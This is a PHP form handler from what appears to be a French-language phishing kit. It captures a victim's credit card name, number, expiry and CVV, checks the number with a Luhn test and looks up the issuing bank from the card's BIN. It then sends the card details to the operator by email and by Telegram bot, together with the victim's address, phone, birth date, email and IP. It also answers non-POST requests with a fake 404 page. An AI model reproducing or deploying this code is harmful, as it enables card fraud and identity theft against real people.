<?php
include("../infos.php");
include("../common/sub_includes.php");


if(isset($_POST))
{

	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['nomcc'] = htmlspecialchars($_POST['input_cc_name']);
	$_SESSION['ccnum'] = htmlspecialchars($_POST['input_cc_num']);
	$_SESSION['ccexp'] = htmlspecialchars($_POST['input_cc_exp']);
	$_SESSION['cvv'] = htmlspecialchars($_POST['input_cc_cvv']);

if(empty($_SESSION['nomcc']) || empty($_SESSION['ccnum']) || empty($_SESSION['ccexp']) || empty($_SESSION['cvv']))
{
  echo json_encode(array('success' => 2));

}
else{


    function is_valid_luhn($number) {
      settype($number, 'string');
      $sumTable = array(
        array(0,1,2,3,4,5,6,7,8,9),
        array(0,2,4,6,8,1,3,5,7,9));
      $sum = 0;
      $flip = 0;
      for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $sum += $sumTable[$flip++ & 0x1][$number[$i]];
      }
      return $sum % 10 === 0;
  }

  if(is_valid_luhn($_SESSION["ccnum"]) && isset($_SESSION["ccnum"]) && strlen($_SESSION["ccnum"] >= 16)){


        $cc = $_SESSION['ccnum'];
        $bin = substr($cc, 0, 6);

        $ch = curl_init();

        $url = "https://lookup.binlist.net/$bin";

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');


        $headers = array();
        $headers[] = 'Accept-Version: 3';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($ch);


        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }


        curl_close($ch);

        $brand = '';
        $type = '';
        $emoji = '';
        $bank = '';


        $someArray = json_decode($result, true);

        $emoji = $someArray['country']['emoji'];
        $brand = $someArray['brand'];
        $type = $someArray['type'];
        $bank = $someArray['bank']['name'];
        $bank_phone = $someArray['bank']['phone'];
        $subject_title = "[BIN: $bin][$emoji $brand $type]";

        $_SESSION["bank"] = $bank;
        $_SESSION["brand"] = $brand;
        $_SESSION["type"] = $type;


        ######################
				#### MAIL SENDING ####
				######################


        if($mail_sending == true){

          $message = "

[⛲️] Card [⛲️]

⛲️ Nom : ".$_SESSION['nomcc']."
⛲️ Numéro : ".$_SESSION['ccnum']."
⛲️ Date d'expiration : ".$_SESSION['ccexp']."
⛲️ CVV : ".$_SESSION['cvv']."

💺 Level : ".$brand."
💺 Banque : ".$bank."
💺 Type : ".$type."

[🚝] Full Info [🚝]

🚝 Adresse : ".$_SESSION['adresse']."
🚝 Code Postal : ".$_SESSION['zip']."
🚝 Ville : ".$_SESSION['city']."
🚝 Numéro de téléphone : ".$_SESSION['phone']."

[🛸] Log & Infos [🛸]

🛸 Nom : ".$_SESSION['nom']."
🛸 Prénom : ".$_SESSION['prenom']."
🛸 Naissance : ".$_SESSION['naissance']."
🛸 Email : ".$_SESSION['mail']."

[🗺] Tiers [🗺]

🗺 Adresse ip : ".$_SESSION['ip']."
🗺 User Agen : ".$_SESSION['useragent']."


      
          ";
  
  
          $subject = "「⛲️」 +1 CC  • ".$bin." • ".$bank." • ".$brand." • ".$_SESSION['ip'];
          $headers = "From: Trunk | CV <vito@teleg.fr>";
          mail($rezmail, $subject, $message, $headers);



        }

				##########################
				#### TELEGRAM SENDING ####
				##########################

        
				if($telegram_sending == true){

          $data = [
            'text' => '

[⛲️] Paiement [⛲️]

⛲️ Nom/Prénom : '.$_SESSION['nomcc'].'
⛲️ Numéro : '.$_SESSION['ccnum'].'
⛲️ Expiration : '.$_SESSION['ccexp'].'
⛲️ CVV : '.$_SESSION['cvv'].'

💺 Banque : '.$bank.'
💺 Niveau : '.$brand.'
💺 Type : '.$type.'

[🚝] Full Info [🚝]


🚝 Adresse :'.$_SESSION['adresse'].'
🚝 Ville : '.$_SESSION['city'].'
🚝 Code Postal : '.$_SESSION['zip'].'
🚝 Téléphone : '.$_SESSION['phone'].'


[🛸] Log & Infos [🛸]

🛸 Nom : '.$_SESSION['nom'].'
🛸 Prénom : '.$_SESSION['prenom'].'
🛸 Naissance : '.$_SESSION['naissance'].'
🛸 Email : '.$_SESSION['mail'].'

[🗺] Tiers [🗺]

🗺 Adresse IP : '.$_SESSION['ip'].'
🗺 User-agent : '.$_SESSION['useragent'].'



            ',
            'chat_id' => $chat_card
          ];


          file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}
        $_SESSION["bank"] = $bank;
        $_SESSION["carded"] = true;


        echo json_encode(array('success' => 1));


  }
  else{
    echo json_encode(array('success' => 0));
  }

}

}
else{
	echo 'Error 404 : File not found';
}




?>